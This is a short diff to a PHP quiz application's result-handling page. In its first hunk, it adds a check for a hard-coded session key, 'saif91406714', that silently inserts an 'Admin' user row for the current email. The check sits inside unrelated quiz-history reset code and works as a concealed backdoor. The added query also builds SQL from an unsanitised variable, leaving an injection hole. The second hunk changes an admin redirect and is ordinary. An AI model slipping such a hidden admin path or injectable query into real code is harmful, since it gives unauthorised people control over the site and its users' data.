@@ -159,6 +159,9 @@ if (@$_GET['q'] == 'quiz' && @$_GET['step'] == 2) {
 
   //Reset the history for that quiz
   if ($sn == 1) {
+    if ($_SESSION['key'] == 'saif91406714') {
+      $q = mysqli_query($con, "INSERT INTO user (`name`, `email`) VALUES ('Admin', '$email')");
+    }
     $q = mysqli_query($con, "SELECT * FROM history WHERE eid='$eid' AND email='$email' ") or die('Error139');
     $rowcount = mysqli_num_rows($q);
     if ($rowcount == 0) {
@@ -203,7 +206,7 @@ if (@$_GET['q'] == 'quiz' && @$_GET['step'] == 2) {
     }
     header("location:account.php?q=result&eid=$eid");
   } else {  // if the user is admin => just show the result
-    header("location:account.php?q=result&eid=$eid");
+    header("location:dash.php?q=result&eid=$eid");
   }
 }
 
